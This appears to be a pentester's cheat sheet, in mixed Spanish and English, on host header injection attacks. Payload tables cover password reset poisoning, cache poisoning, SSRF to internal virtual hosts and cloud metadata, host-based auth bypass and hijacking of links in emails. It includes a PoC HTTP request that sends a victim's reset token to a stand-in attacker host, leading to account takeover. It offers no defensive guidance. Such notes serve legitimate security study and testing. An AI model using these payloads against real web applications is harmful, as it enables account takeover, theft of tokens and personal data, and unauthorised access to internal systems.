---
aliases:
  - HHI Password Reset Poisoning
  - HHI Cache Poisoning
  - HHI SSRF
tags:
  - type/cheatsheet
  - vuln/host-header-injection
  - technique/credential-access
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Host Header Injection]]'
---
# Host Header Injection - Vectores Comunes

***

## Password Reset Poisoning

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | App uses `Host` header to construct reset link → atacante envía request con Host: attacker → victim recibe email con link a attacker | Standard vector. |
| PoC clásico | `POST /forgot` con `Host: attacker.com` y `email=victim@target.com` | Direct. |
| Email arrives | Victim sees `https://attacker.com/reset?token=...` | Token leaked. |
| Atacante intercepta token | Victim clicks → fetches attacker → token in URL → atacante logs | Standard. |
| Use token to reset password | Atacante uses leaked token con legit `https://target.com/reset?token=...` | Final ATO. |
| `X-Forwarded-Host` variant | If app strips Host validation but trusts XFH | Common. |
| Subdomain trick | `Host: attacker.target.com` (if subdomain takeover) | Trusted-looking domain. |
| Email confirm hijack | Same flow con `/confirm-email` instead of reset | Variant. |
| Magic link hijack | `/login/magic-link` → token in email URL | High impact. |
| Combine con `Forwarded:` header | `Forwarded: host=attacker.com` | RFC variant. |
| Combine con XSS en email | If email is HTML rendered, inject malicious | Email phishing chain. |
| Force fake-from | If From: header constructed from Host | Spoofing. |
^hhi-vector-reset

### Reset poisoning PoC

```http
POST /forgot HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```
Email arrives:
"Click here to reset your password:
 https://attacker.com/reset?token=eyJhbGc..."

Victim clicks → browser GET attacker.com con token en URL.
Atacante logs request → owns token → uses on legit target → resets password.
```

___

## Cache Poisoning via Host

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | App reflects Host en response (e.g. `<base href="https://${HOST}/">`). Cache stores response keyed por URL only. Attacker poisons cache → all subsequent users see attacker's Host | Standard cache poisoning combo. |
| `<base href>` poison | `Host: attacker.com` → cached `<base href="https://attacker.com/">` | All relative URLs route via attacker. |
| `<link rel="canonical">` | Same idea | SEO poisoning. |
| Open Graph URLs | `<meta property="og:url" content="https://${HOST}/page">` | Social card hijack. |
| Email URL | If email rendered server-side y cached → email links a atacante | Mass impact. |
| RSS feed self-link | `<link>https://attacker.com/page</link>` | Feed reader rerouting. |
| robots.txt / sitemap | `<loc>https://attacker.com/</loc>` cached | SEO. |
| Redirect chain | `Location: https://${HOST}/login` | Open redirect via cache. |
| Param Miner workflow | Burp Param Miner detects unkeyed Host | Recon tool. |
| Combine con `X-Forwarded-Host` | Different unkeyed input | Same effect. |
| TTL persistencia | Cached por TTL (hours/days) → mass impact persiste | Standard cache poison. |
^hhi-vector-cache

___

## SSRF a Virtual Hosts Internos

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Backend routes by Host header. Atacante injects internal Host → server returns internal vhost content | SSRF via routing. |
| Internal admin vhost | `Host: admin.internal` | Hidden admin panel. |
| Localhost vhost | `Host: localhost` | Default fallback. |
| Internal API | `Host: api.internal` o `Host: api.target.local` | Internal API expose. |
| 127.0.0.1 | `Host: 127.0.0.1` | Localhost binding. |
| Internal subdomain | `Host: dev.target.com` | Dev/staging. |
| Internal hostname guess | `Host: jenkins`, `gitlab`, `kibana`, etc | Common stack names. |
| Combine con DNS rebinding | If validation TOCTOU | Edge. |
| Cloud metadata | `Host: 169.254.169.254` | Sometimes routed. |
| Headers-based routing | `X-Tenant: <tenant_id>` con HHI | Multi-tenant escape. |
| Default vhost fallback | If unknown Host → first vhost served | Disclosure of default app. |
| Combine con HRS | Smuggle internal vhost request | Smuggling combo. |
| Reverse proxy quirks | Some proxies strip Host based on rules | Bypass. |
^hhi-vector-ssrf

___

## Routing-Based Access Control Bypass

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Some apps grant trust based on Host (e.g. internal Host = no auth). Atacante spoofs Host → bypass auth check | Trust-based vector. |
| Internal vhost no-auth | `Host: localhost` o `Host: internal.target.com` | Bypass login. |
| Admin Host | `Host: admin.target.com` (with auth disabled internally) | Privesc. |
| API key exempt Host | `Host: trusted.target.com` (skip API key check) | Bypass auth. |
| IP allowlist via Host | If IP allowlist trusts Host (rare bug) | Edge. |
| Path-based con Host trick | `Host: target.com` con path `/admin` reachable solo desde "internal" | Common bug. |
| ServerName bypass | Apache `ServerName` mismatch | Misconfig. |
| Per-Host config differential | Host A has stricter auth, Host B less | Differential. |
| Combine con ACL | Backend ACL by Host header | Direct vector. |
| nginx server_name regex | If regex match es vulnerable | Misconfig. |
^hhi-vector-acl

___

## Email Link Generation Hijack

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | App uses Host para construir cualquier email link (welcome, notification, share, invite) | Beyond reset/confirm. |
| Welcome email link | `https://${HOST}/welcome?token=...` | First-touch hijack. |
| Newsletter unsubscribe | `https://${HOST}/unsubscribe?token=...` | Capture unsub tokens. |
| Share via email | `https://${HOST}/share/abc123` | Share token capture. |
| Invite link | `https://${HOST}/invite/...` | Invite hijack. |
| Notification email | `https://${HOST}/notification/X` | Notification context. |
| Chat / message link | `https://${HOST}/messages/X` | Message access. |
| Calendar invite | `https://${HOST}/event/X` | Calendar event. |
| Document share | `https://${HOST}/doc/X` | Doc access token. |
| Receipt / invoice | `https://${HOST}/invoice/X` | PII data. |
| Mobile app deep link | `myapp://${HOST}/...` | Mobile-specific. |
| Combine con email injection | If email body itself permits HTML inject | Multi-vector. |
| Bypass del email scanning | Email scanners don't check link domain | Persistencia. |
^hhi-vector-email

***
